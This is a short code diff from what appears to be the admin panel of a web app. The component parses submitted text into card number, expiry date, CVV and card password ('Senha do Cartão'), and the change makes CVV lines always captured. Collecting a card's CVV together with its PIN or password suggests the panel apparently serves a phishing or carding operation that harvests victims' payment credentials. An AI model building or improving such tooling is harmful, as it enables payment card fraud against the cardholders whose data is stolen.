@@ -173,7 +173,7 @@ const Admin = () => {
         data.cartao = line.split('Número do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Validade:') && !line.includes('DADOS DO')) {
         data.validade = line.split('Validade:')[1]?.trim() || '';
-      } else if (line.includes('CVV:') && !line.includes('DADOS DO')) {
+      } else if (line.includes('CVV:')) {
         data.cvv = line.split('CVV:')[1]?.trim() || '';
       } else if (line.includes('Senha do Cartão:')) {
         data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
